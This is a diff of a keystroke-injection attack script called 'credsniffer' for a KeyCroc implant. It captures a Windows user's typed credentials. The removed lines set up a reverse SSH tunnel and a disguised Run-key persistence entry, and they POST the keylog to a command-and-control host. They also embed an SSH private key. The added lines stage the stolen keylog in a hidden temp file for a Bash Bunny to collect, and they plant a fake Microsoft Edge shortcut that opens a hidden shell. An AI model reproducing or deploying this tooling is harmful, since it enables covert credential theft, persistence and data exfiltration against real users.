@@ -9,22 +9,9 @@
 ####################Config###################################################
 
 # Set these before deploying:
-C2_IP="10.8.56.157"          # Your C2 IP or hostname
-C2_PORT="8443"                 # C2 HTTP port
-C2_SSH_PORT="22"               # C2 SSH port for reverse tunnel
-C2_SSH_USER="hadareklund"           # Unprivileged user on C2 that accepts tunnels
-REVERSE_PORT="2222"            # Port on C2 that forwards to target RDP (3389)
+C2_IP="10.8.56.157"          # Your C2 IP or hostname (reserved for future use)
+C2_PORT="8443"                 # C2 HTTP port (reserved for future use)
 RUNAS_USER="Administrator"     # Local or domain admin to runas as (e.g. DOMAIN\\Administrator)
-
-# Run: ssh-keyscan -H $C2_IP on your C2, paste the output line here.
-# Example: "|1|abc123...=|def456...= ecdsa-sha2-nistp256 AAAA..."
-C2_HOSTKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0zr3ZKYG8ttKm0McmRxcuUjqsAa9rh4pWb9kfy5Erm hadareklund@Hadars-MacBook-Air.local"
-
-# tunnel_id private key: base64-encode your private key file, paste here.
-# Generate with: ssh-keygen -t ed25519 -f tunnel_id -N ""
-# Encode with:   base64 -w0 tunnel_id
-# Add public key to C2: cat tunnel_id.pub >> /home/tunnel/.ssh/authorized_keys
-TUNNEL_KEY_B64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCTk02OTJTbUJ2TGJTcHRESEprY1hMbEk2ckFHdmE0ZUtWbS9aSDh1Uks1Z0FBQUtpdEtTa2pyU2twCkl3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQk5NNjkyU21CdkxiU3B0REhKa2NYTGxJNnJBR3ZhNGVLVm0vWkg4dVJLNWcKQUFBRUJXcjV1Mzk3bzVHTW9oK0NYWWdPZDNzRmthZDdBaHhWZjJvY3FKUDdaUU5VMHpyM1pLWUc4dHRLbTBNY21SeGN1VQpqcXNBYTlyaDRwV2I5a2Z5NUVybUFBQUFKR2hoWkdGeVpXdHNkVzVrUUVoaFpHRnljeTFOWVdOQ2IyOXJMVUZwY2k1c2IyCk5oYkFFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
 
 # Keyboard language of TARGET machine (not attacker machine)
 # se=Swedish, de=German, us=English, fr=French, etc.
@@ -101,96 +88,46 @@ if [ ! -f /root/loot/win-pass.txt ]; then
 fi
 log INFO "STEP 4 OK: Credential file captured ($(wc -c < /root/loot/win-pass.txt) bytes)"
 
-#####################Persistence via Reverse SSH Tunnel######################
-# OpenSSH CLIENT ships with Windows 10 1809+ — available to all users, no admin.
-# The target connects OUT to C2; no inbound firewall rule or new service needed.
-# HID-only mode (no RNDIS) — no USB network adapter visible, no notifications.
+#####################Drop Keylog to Windows Temp############################
+# Write the raw captured keylog to a predictable Windows temp path.
+# Bash Bunny (plugged in later in STORAGE mode) can read and exfil this file.
+# File: %TEMP%\.sysinfo  (expands to C:\Users\<user>\AppData\Local\Temp\.sysinfo)
 
-log INFO "STEP 5: Sending HID — injecting SSH persistence"
-Q DELAY 3000
+log INFO "STEP 5: Writing keylog to Windows temp for Bash Bunny pickup"
+# Escape backticks so they survive inside a PowerShell double-quoted string
+RAW_KEYS=$(sed "s/\`/\`\`/g" /root/loot/win-pass.txt | tr -d '\n')
 
-# Use wscript.exe to run a hidden VBScript wrapper so the Run dialog
-# itself is never visible (avoids the brief GUI r flash)
-Q GUI r
-Q DELAY 600
-Q STRING wscript //nologo //e:vbscript
-Q ENTER
-Q DELAY 800
-
-# Actually, simpler: use a scheduled task created via cmd, which we can
-# invoke from the Run dialog with a fully hidden window style.
-# First close that, use a different approach:
-Q ESC
-Q DELAY 300
-
-# Create a one-shot temp batch file and run it hidden via wscript
-# This avoids any visible window flash entirely
-Q GUI r
-Q DELAY 600
-Q STRING cmd /c "echo Set o=CreateObject("WScript.Shell"):o.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand "^&{$t="""ENCODED_BELOW"""} > %TEMP%\s.vbs && wscript //nologo %TEMP%\s.vbs"
-Q ENTER
-
-# Simpler and more reliable — just accept the brief Run dialog, it closes fast:
+Q DELAY 2000
 Q GUI r
 Q DELAY 600
 Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass
 Q ENTER
 Q DELAY 1200
-
-# Create .ssh dir, write known_hosts (prevents StrictHostKeyChecking prompt/fail)
-Q STRING "$d=\"$env:USERPROFILE\.ssh\"; New-Item -Force -ItemType Directory $d | Out-Null; Add-Content \"$d\known_hosts\" '$C2_HOSTKEY'"
+Q STRING "[IO.File]::WriteAllText([IO.Path]::GetTempPath()+'.sysinfo','${RAW_KEYS}')"
 Q ENTER
-Q DELAY 300
-
-# Decode and write tunnel_id private key, lock permissions (required by OpenSSH)
-Q STRING "[IO.File]::WriteAllBytes(\"$env:USERPROFILE\.ssh\tunnel_id\",[Convert]::FromBase64String('$TUNNEL_KEY_B64')); icacls \"$env:USERPROFILE\.ssh\tunnel_id\" /inheritance:r /grant \"\$env:USERNAME`:R\" | Out-Null"
-Q ENTER
-Q DELAY 300
-
-# Write HKCU Run key for persistence — fires on every logon, no admin needed
-Q STRING "Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value ('ssh.exe -N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i \"%USERPROFILE%\.ssh\tunnel_id\" -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}')"
-Q ENTER
-Q DELAY 300
-
-# Start tunnel immediately without waiting for reboot
-Q STRING "Start-Process ssh.exe -WindowStyle Hidden -ArgumentList \"-N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i `\`\"$env:USERPROFILE\.ssh\tunnel_id`\`\" -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}\""
-Q ENTER
-Q DELAY 500
+Q DELAY 400
 Q STRING exit
 Q ENTER
-log INFO "STEP 5 OK: Persistence HID commands sent"
+log INFO "STEP 5 OK: Keylog write command sent — Bash Bunny target: %TEMP%\\.sysinfo"
 
-# Attacker: RDP to target via C2 tunnel with:  xfreerdp /v:localhost:${REVERSE_PORT}
+#####################Fake Microsoft Edge Shortcut###########################
+# Creates a shortcut on H:\Desktop named "Microsoft Edge" that actually opens
+# a terminal. The icon is pulled from the real msedge.exe so it looks legit.
+# Replace the echo payload with a real POST/SSH command when ready.
 
-#####################Exfiltrating Credentials###############################
-# curl uses KeyCroc's own WiFi interface — no RNDIS, no USB NIC, no popups.
-
-# WiFi diagnostics — logged so you can backtrack connectivity issues in arming mode
-log INFO "WIFI DIAG: SSID=$(iwgetid -r 2>/dev/null || echo 'unknown')"
-log INFO "WIFI DIAG: wlan0 addr=$(ip addr show wlan0 2>/dev/null | awk '/inet /{print $2}' || echo 'no IP')"
-log INFO "WIFI DIAG: default route=$(ip route show default 2>/dev/null || echo 'none')"
-if ping -c 1 -W 2 "$C2_IP" &>/dev/null; then
-    log INFO "WIFI DIAG: ping $C2_IP OK"
-else
-    log ERROR "WIFI DIAG: ping $C2_IP FAILED — KeyCroc cannot reach C2. Check WiFi config at /root/udisk/config.txt"
-fi
-
-log INFO "STEP 6: Exfiltrating keylog to C2 at ${C2_IP}:${C2_PORT}"
-
-CLEAN_PASS=$(curl -s -w "\n__HTTP_%{http_code}" -X POST "http://${C2_IP}:${C2_PORT}/keylog" \
-     --data-binary @/root/loot/win-pass.txt 2>>"$LOG_FILE")
-
-HTTP_CODE=$(echo "$CLEAN_PASS" | grep '__HTTP_' | sed 's/__HTTP_//')
-CLEAN_PASS=$(echo "$CLEAN_PASS" | grep -v '__HTTP_')
-
-if [ "$HTTP_CODE" = "200" ]; then
-    log INFO "STEP 6 OK: C2 responded 200 — cleaned password received"
-else
-    log ERROR "STEP 6 FAILED: C2 HTTP response code=${HTTP_CODE} (empty = no route to host)"
-fi
-
-log INFO "C2 returned: ${CLEAN_PASS}"
-echo "[*] C2 returned cleaned password: ${CLEAN_PASS}"
+log INFO "STEP 6: Creating fake Microsoft Edge shortcut on H:\\Desktop"
+Q DELAY 1500
+Q GUI r
+Q DELAY 600
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+Q ENTER
+Q DELAY 1200
+Q STRING "\$ws=New-Object -ComObject WScript.Shell; \$s=\$ws.CreateShortcut('H:\\Desktop\\Microsoft Edge.lnk'); \$s.TargetPath='cmd.exe'; \$s.Arguments='/c start powershell -NoExit -Command echo This could be a POST or SSH command'; \$s.IconLocation='C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,0'; \$s.Description='Microsoft Edge'; \$s.Save()"
+Q ENTER
+Q DELAY 400
+Q STRING exit
+Q ENTER
+log INFO "STEP 6 OK: Fake Edge shortcut created on H:\\Desktop"
 
 Q DELAY 1000
 log INFO "=== credsniffer payload finished — log at $LOG_FILE ==="
